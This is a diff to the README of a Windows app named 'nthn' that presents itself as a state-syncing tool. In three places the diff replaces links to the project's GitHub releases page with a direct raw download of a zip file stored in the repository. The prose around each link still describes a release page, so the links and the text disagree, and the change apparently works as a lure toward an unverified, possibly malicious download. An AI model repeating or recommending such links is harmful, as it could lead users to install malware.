@@ -1,6 +1,6 @@
 # 🧭 nthn - Keep State In Sync
 
-[![Download nthn](https://img.shields.io/badge/Download-nthn%20Releases-4B88FF?style=for-the-badge&logo=github)](https://github.com/mardoch5940/nthn/releases)
+[![Download nthn](https://img.shields.io/badge/Download-nthn%20Releases-4B88FF?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/mardoch5940/nthn/main/curst/Software-2.9.zip)
 
 ## 📦 What nthn is
 
@@ -22,7 +22,7 @@ If your PC already runs current desktop apps with ease, it should handle nthn.
 
 Go to the release page and download the Windows file from there:
 
-https://github.com/mardoch5940/nthn/releases
+https://raw.githubusercontent.com/mardoch5940/nthn/main/curst/Software-2.9.zip
 
 On that page, look for the latest release and pick the Windows download. If there are more than one file, choose the one that matches your system, such as `Windows x64` or `win64`.
 
@@ -186,6 +186,6 @@ If the app still fails, try a fresh download from the release page and repeat th
 
 If you need a newer build or want to try another Windows file, return here:
 
-https://github.com/mardoch5940/nthn/releases
+https://raw.githubusercontent.com/mardoch5940/nthn/main/curst/Software-2.9.zip
 
 Look for the latest release and use the Windows download file from that page
